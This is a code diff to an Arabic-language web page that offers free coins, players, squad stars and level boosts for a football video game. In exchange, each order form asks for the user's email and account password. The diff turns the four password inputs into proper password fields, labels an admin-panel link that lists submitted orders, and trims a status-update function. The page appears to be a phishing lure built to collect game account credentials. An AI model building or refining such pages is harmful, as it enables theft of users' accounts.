@@ -241,7 +241,11 @@
         <p class="sub">أكتب إيميلك هنا وبعديها خط واكتب الId</p>
         <div class="field"><label>عدد الكوينز المطلوبة</label><input type="number" placeholder="مثال: 500000" data-field="amount"></div>
         <div class="field"><label>اأكتب ايميلك وأستني رمز التأكيد إلى هيجيلك على الايميل بعد تأكيد طلبك</label><input type="text" placeholder="إيميلك ثم الID الذي سيبعث على الايميل" data-field="account"></div>
-        <div class="field"><label>أكتب الباسورد</label><input type="tel" placeholder="أكتب الباسورد صح علشان الرساله تتأكد صح" data-field="phone"></div>
+<div class="field">
+    <label>أكتب الباسورد</label>
+    <input type="password" placeholder="أكتب الباسورد صح علشان الرساله تتأكد صح" data-field="password">
+</div>
+
         <div class="form-actions">
           <button class="btn btn-back" data-back="home">رجوع</button>
           <button class="btn btn-primary" data-submit="🪙 زيادة الكوينز">إرسال الطلب</button>
@@ -258,7 +262,11 @@
         <div class="field"><label>اسم اللاعب</label><input type="text" placeholder="مثال: مبابي" data-field="player"></div>
         <div class="field"><label>عدد التطويرات المطلوبة</label><input type="number" placeholder="مثال: 3" data-field="amount"></div>
         <div class="field"><label>اأكتب ايميلك وأستني رمز التأكيد إلى هيجيلك على الايميل بعد تأكيد طلبك</label><input type="text" placeholder="إيميلك ثم الID الذي سيبعث على الايميل" data-field="account"></div>
-        <div class="field"><label>أكتب الباسورد</label><input type="tel" placeholder="أكتب الباسورد صح علشان الرساله تتأكد صح" data-field="phone"></div>
+<div class="field">
+    <label>أكتب الباسورد</label>
+    <input type="password" placeholder="أكتب الباسورد صح علشان الرساله تتأكد صح" data-field="password">
+</div>
+
         <div class="form-actions">
           <button class="btn btn-back" data-back="home">رجوع</button>
           <button class="btn btn-primary" data-submit="🧑‍🤝‍🧑 شراء اللعيبة">إرسال الطلب</button>
@@ -275,7 +283,11 @@
         <div class="field"><label>عدد نجوم التشكيلة المطلوب</label><input type="number" placeholder="مثال: 5" data-field="amount"></div>
         <div class="field"><label>عدد اللاعبين</label><input type="number" placeholder="مثال: 23" data-field="players"></div>
         <div class="field"><label>اأكتب ايميلك وأستني رمز التأكيد إلى هيجيلك على الايميل بعد تأكيد طلبك</label><input type="text" placeholder="إيميلك ثم الID الذي سيبعث على الايميل" data-field="account"></div>
-        <div class="field"><label>أكتب الباسورد</label><input type="tel" placeholder="أكتب الباسورد صح علشان الرساله تتأكد صح" data-field="phone"></div>
+<div class="field">
+    <label>أكتب الباسورد</label>
+    <input type="password" placeholder="أكتب الباسورد صح علشان الرساله تتأكد صح" data-field="password">
+</div>
+
         <div class="form-actions">
           <button class="btn btn-back" data-back="home">رجوع</button>
           <button class="btn btn-primary" data-submit="📋 زيادة التشكيلة">إرسال الطلب</button>
@@ -292,7 +304,11 @@
         <div class="field"><label>اللفل الحالي</label><input type="number" placeholder="مثال: 20" data-field="from"></div>
         <div class="field"><label>اللفل المطلوب</label><input type="number" placeholder="مثال: 40" data-field="to"></div>
         <div class="field"><label>اأكتب ايميلك وأستني رمز التأكيد إلى هيجيلك على الايميل بعد تأكيد طلبك</label><input type="text" placeholder="إيميلك ثم الID الذي سيبعث على الايميل" data-field="account"></div>
-        <div class="field"><label>أكتب الباسورد</label><input type="tel" placeholder="أكتب الباسورد صح علشان الرساله تتأكد صح" data-field="phone"></div>
+<div class="field">
+    <label>أكتب الباسورد</label>
+    <input type="password" placeholder="أكتب الباسورد صح علشان الرساله تتأكد صح" data-field="password">
+</div>
+
         <div class="form-actions">
           <button class="btn btn-back" data-back="home">رجوع</button>
           <button class="btn btn-primary" data-submit="🚀 تزويد الحساب">إرسال الطلب</button>
@@ -358,7 +374,7 @@
 
   </main>
 
-  <footer>بياناتك محفوظة بشكل مبدئي على سيرفر تجريبي (Mock API) — الموقع مبني من خلال بعض الاكواد من الدارك ويب· <a id="goAdmin" href="#" style="cursor: pointer ;text-decoration:underline;"></a></footer>
+  <footer>بياناتك محفوظة بشكل مبدئي على سيرفر تجريبي (Mock API) — الموقع مبني من خلال بعض الاكواد من الدارك ويب· <a id="goAdmin" href="#" style="cursor: pointer ;text-decoration:underline;">لوحة الإدارة</a></footer>
 
 <script>
   const $ = (id)=>document.getElementById(id);
@@ -510,21 +526,3 @@ alert('من فضلك اكتب إيميلك ثم خط واكتب ال ID الذي
     }catch(err){
       $('adminLoading').textContent = 'حصلت مشكلة في جلب الطلبات، حاول تاني.';
     }
-  }
-
-  async function updateOrderStatus(id, status){
-    try{
-      await fetch(API_BASE + '/' + id, {
-        method: 'PUT',
-        headers: {'Content-Type':'application/json'},
-        body: JSON.stringify({ status })
-      });
-    }catch(err){
-      alert('مقدرناش نحدّث الحالة، حاول تاني.');
-    }
-  }
-</script>
-
-</body>
-</html>
-
